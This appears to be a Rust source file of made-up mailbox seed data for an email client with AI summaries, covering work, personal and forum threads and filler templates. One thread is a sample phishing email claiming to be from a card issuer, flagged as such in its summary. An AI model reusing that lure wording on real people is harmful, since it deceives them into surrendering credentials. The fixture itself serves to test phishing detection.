    Story {
        account: WORK, subject: "Lunch & learn: vector search 101", labels: &[],
        category: Category::Other, priority: 25, needs_reply: false, due_days: Some(5), flagged: false, unread: 0,
        summary: "Aiko gives a vector search talk next Monday at 12:30; lunch provided.",
        ai_summary: "Aiko is giving a lunch-and-learn on vector search next Monday at 12:30 in the big room. Lunch is \
provided if you sign up by Friday.",
        actions: &[("Sign up by Friday", Some(3))],
        msgs: &[m(AIKO, 1900, "Hi all, I'm doing a lunch & learn on vector search next Monday, 12:30, big room. Sign up by Friday if you want lunch!")],
    },
    Story {
        account: ANON, subject: "Welcome to the Tinkerers forum", labels: &["Forums"],
        category: Category::Notification, priority: 10, needs_reply: false, due_days: None, flagged: false, unread: 0,
        summary: "Account created; the forum rules and how to set a display name.",
        ai_summary: "A welcome note from the Tinkerers forum with the rules and how to change your display name.",
        actions: &[],
        msgs: &[m(P("Tinkerers Forum", "hello@tinkerers.example"), 9000, "Welcome, quiet.otter! Read the rules pinned in each board. You can change your display name in settings.")],
    },
    Story {
        account: PERSONAL, subject: "Your library hold is ready", labels: &[],
        category: Category::Transactional, priority: 30, needs_reply: false, due_days: Some(7), flagged: false, unread: 0,
        summary: "'The Glass Orchard' is waiting at Harbour Street branch until next Tuesday.",
        ai_summary: "Your hold on 'The Glass Orchard' is ready at the Harbour Street branch. Pick it up by next Tuesday.",
        actions: &[("Pick up the book by Tuesday", Some(7))],
        msgs: &[m(P("City Library", "holds@citylibrary.example"), 2400, "Good news! 'The Glass Orchard' is ready for pickup at Harbour Street. We'll hold it until next Tuesday.")],
    },
    Story {
        account: WORK, subject: "Security review: action needed on two repos", labels: &[],
        category: Category::Important, priority: 65, needs_reply: false, due_days: Some(6), flagged: false, unread: 0,
        summary: "IT asks you to rotate one deploy key and enable branch protection on atlas-docs.",
        ai_summary: "The quarterly security review found an old deploy key on atlas-api and no branch protection on \
atlas-docs. IT asks you to rotate the key and turn protection on within a week.",
        actions: &[("Rotate the atlas-api deploy key", Some(6)), ("Protect main on atlas-docs", Some(6))],
        msgs: &[m(P("Northwind IT", "it@northwind-labs.example"), 3200, "Hi Sam,\n\nThe quarterly review flagged two things you own:\n1. atlas-api: deploy key older than a year. Please rotate.\n2. atlas-docs: no branch protection on main.\n\nPlease fix within a week.\n\nThanks,\nIT")],
    },
    Story {
        account: WORK, subject: "RE: Q3 numbers for the board deck", labels: &[],
        category: Category::Important, priority: 72, needs_reply: false, due_days: Some(3), flagged: false, unread: 1,
        summary: "Inês sent Harborline's Q3 revenue by region for Friday's board deck.",
        ai_summary: "Inês replied with Harborline's Q3 revenue: North 1.2M (+8%), South 0.9M (+3%). The board deck \
goes out Friday at noon; Ravi asked for these for slide 7.",
        actions: &[("Put the numbers on slide 7", Some(3))],
        msgs: &[
            Msg { headers: &[], from: ME, to: &[INES], cc: &[], mins_ago: 1900, html: None, attachments: &[],
                  text: "Hi Ines, could you send the Q3 regional numbers before Friday? Ravi wants them in the board deck.\n\nThanks, Sam" },
            Msg { headers: &[], from: INES, to: &[ME], cc: &[RAVI], mins_ago: 48, html: Some(OUTLOOK_HTML), attachments: &[],
                  text: "Hi Sam,\n\nNumbers for Q3 below, as you asked. The board deck goes out Friday at noon.\n\nRegion  Revenue  vs Q2\nNorth   1.2M     +8%\nSouth   0.9M     +3%\n\nBest regards,\nInes Duarte | Finance Lead\nHarborline" },
        ],
    },
    Story {
        account: PERSONAL, subject: "Action required: your account is on hold", labels: &[],
        category: Category::Spam, priority: 5, needs_reply: false, due_days: None, flagged: false, unread: 1,
        summary: "Looks like phishing: links go to c0balt-secure.example, Reply-To differs, DMARC failed.",
        ai_summary: "This looks like phishing. It claims to be Cobalt Card, but it failed sender checks, its Reply-To goes \
to another domain, and its sign-in link goes somewhere other than it says. Don't sign in from it.",
        actions: &[],
        msgs: &[Msg { headers: PHISHING_HEADERS, from: P("Cobalt Card Security", "security@cobaltcard-alerts.example"), to: &[ME], cc: &[],
                      mins_ago: 30, html: Some(PHISHING_HTML), attachments: &[],
                      text: "Your Cobalt Card account is on hold. Sign in within 24 hours to restore access: https://www.cobaltcard.example/login" }],
    },
    Story {
        account: PERSONAL, subject: "Floor plan for Quay Street", labels: &["Home"],
        category: Category::Personal, priority: 58, needs_reply: true, due_days: Some(4), flagged: false, unread: 1,
        summary: "Priya sent the Quay Street floor plan; viewings Saturday 10 to 12.",
        ai_summary: "Priya from Harbour Lets sent the floor plan for the Quay Street flat. Viewings are on Saturday \
between 10:00 and 12:00 and she wants to know which slot suits you.",
        actions: &[("Pick a viewing slot on Saturday", Some(4))],
        msgs: &[Msg { headers: &[], from: PRIYA, to: &[ME], cc: &[], mins_ago: 140, html: Some(FLOORPLAN_HTML),
                      attachments: &[Att("floorplan.png", "image/png", 18_400, Some("floorplan@harbourlets.example")),
                                     Att("tenancy-terms.pdf", "application/pdf", 96_000, None)],
                      text: "Hi Sam,\n\nHere is the floor plan for the flat on Quay Street, as promised. Viewings are Saturday 10:00 to 12:00.\n\nKind regards,\nPriya Natarajan\nHarbour Lets" }],
    },
];

/// Filler mail, made from templates. `{n}` becomes a number from the thread's index.
pub struct Template {
    pub account: usize,
    pub category: Category,
    pub priority: u8,
    pub from: P,
    pub subject: &'static str,
    pub summary: &'static str,
    pub body: &'static str,
    pub attachment: Option<(&'static str, &'static str, u64)>,
    pub needs_reply: bool,
}

const fn t(account: usize, category: Category, priority: u8, from: P, subject: &'static str, summary: &'static str,
           body: &'static str) -> Template {
    Template { account, category, priority, from, subject, summary, body, attachment: None, needs_reply: false }
}

pub const TEMPLATES: &[Template] = &[
    t(WORK, Category::Notification, 30, P("Northwind CI", "ci@builds.northwind-labs.example"),
      "[atlas] Build #{n} passed on main", "Main is green again after build #{n}.", "Build #{n} on main passed in 5m 48s."),
    t(WORK, Category::Notification, 30, P("Codehub", "notifications@codehub.example"),
      "[atlas] PR #{n}: tidy up config loading", "A small config cleanup PR wants your review.",
      "@ravi requested your review on northwind/atlas#{n}.\n\n+48 -61 across 3 files."),
    Template { attachment: Some(("notes-{n}.pdf", "application/pdf", 54_000)), needs_reply: false,
               ..t(WORK, Category::Personal, 45, DANA, "Notes from the Atlas sync ({n})",
                   "Dana's notes from the weekly Atlas sync, with two owners assigned.",
                   "Notes attached. Two new owners: Aiko on retries, Ravi on pricing.\n\nDana") },
    Template { needs_reply: true, ..t(WORK, Category::Important, 70, RAVI, "Quick question about ticket {n}",
               "Ravi asks whether ticket {n} can wait until next sprint.",
               "Hey, can ticket {n} wait until next sprint, or is it blocking you?\n\nRavi") },
    t(WORK, Category::Newsletter, 20, P("Northwind Weekly", "weekly@northwind-labs.example"),
      "Northwind Weekly: issue {n}", "Company news: two new hires, the offsite date, a new coffee machine.",
      "Hello everyone,\n\nTwo new people joined this week. The offsite is confirmed for March. And yes, the coffee machine is fixed."),
    t(WORK, Category::Transactional, 25, P("TripDesk", "trips@tripdesk.example"),
      "Expense report {n} approved", "Your expense report {n} was approved and will be paid Friday.",
      "Expense report {n} (3 items) was approved by Dana Okafor. Payment on Friday."),
    t(WORK, Category::Notification, 25, P("Calendar", "calendar@northwind-labs.example"),
      "Invitation: design review #{n}", "Aiko invited you to a design review on Wednesday 15:00.",
      "Aiko Tanaka invited you to 'Design review #{n}', Wednesday 15:00-15:45, room Fjord."),
    Template { needs_reply: true, ..t(WORK, Category::Important, 60, INES, "Harborline: invoice question {n}",
               "Inês asks why invoice {n} shows two API add-ons.",
               "Hi Sam, invoice {n} shows two API add-ons but we only ordered one. Could you check?\n\nInês") },
    t(PERSONAL, Category::Newsletter, 15, P("The Weekly Byte", "hello@weeklybyte.example"),
      "The Weekly Byte #{n}", "Tools, essays and one long read about sync engines.",
      "This week: a terminal that draws graphs, a long essay on caching, and the usual links."),
    t(PERSONAL, Category::Transactional, 30, P("Parcelly", "orders@parcelly.example"),
      "Your order #{n} has been delivered", "Parcelly order {n} was left at the front door.",
      "Your parcel was delivered and left at the front door at 14:12."),
    t(PERSONAL, Category::Promotion, 10, P("Northpeak Outfitters", "deals@northpeak.example"),
      "New arrivals: trail shoes for wet weather", "Northpeak's new trail shoes; 10% off first orders.",
      "Grip that works on wet rock. New trail shoes are in."),
    t(PERSONAL, Category::Transactional, 35, P("Gridline Energy", "bills@gridline.example"),
      "Your energy bill for period {n}", "Gridline bill: 84.12, paid by direct debit on the 5th.",
      "Your bill is 84.12. It will be collected by direct debit on the 5th."),
    Template { needs_reply: true, ..t(PERSONAL, Category::Personal, 55, MAYA, "Re: climbing on Wednesday?",
               "Maya asks if you're coming climbing on Wednesday.",
               "Are you coming Wednesday? I'll book the 18:00 slot if so.") },
    Template { attachment: Some(("recipe-{n}.pdf", "application/pdf", 22_000)),
               ..t(PERSONAL, Category::Personal, 40, ELENA, "That soup recipe",
                   "Elena sent the squash soup recipe she mentioned.",
                   "Here's the squash soup I promised. Double the ginger.") },
    t(PERSONAL, Category::Notification, 20, P("Streamly", "no-reply@streamly.example"),
      "New episodes this week", "Two shows you follow have new episodes.",
      "New this week: 'The Lighthouse Keepers' S2E{n} and 'Harbour Lights' E{n}."),
    t(PERSONAL, Category::Transactional, 35, P("Skyway", "itinerary@skyway.example"),
      "Your trip receipt {n}", "Skyway receipt for booking {n}.", "Thanks for flying with Skyway. Receipt for booking {n} attached."),
    t(PERSONAL, Category::Promotion, 10, P("Brightcart", "news@brightcart.example"),
      "Your weekend picks are here", "Brightcart's weekly deals on kitchen things.", "Hand-picked deals for your kitchen. This weekend only."),
    t(PERSONAL, Category::Spam, 0, P("Prize Desk", "winner@prize-desk.example"),
      "You have been selected (ref {n})", "Looks like spam: a prize you did not enter for.",
      "Congratulations, you have been selected. Click to claim."),
    t(ANON, Category::Notification, 20, P("Tinkerers Forum", "digest@tinkerers.example"),
      "Someone replied to your post ({n})", "A reply to your post in Synth DIY.",
      "kestrel_92 replied to your post 'Replacing a stiff slider'."),
    t(ANON, Category::Newsletter, 15, P("Tinkerers Forum", "digest@tinkerers.example"),
      "Digest: {n} new posts in Synth DIY", "Forum digest: new posts in Synth DIY.", "New posts in Synth DIY this week."),
    Template { needs_reply: true, ..t(ANON, Category::Personal, 45, KESTREL, "Question about the listing {n}",
               "A forum member asks about shipping for listing {n}.",
               "Hi, would you ship listing {n}, or local pickup only?") },
];
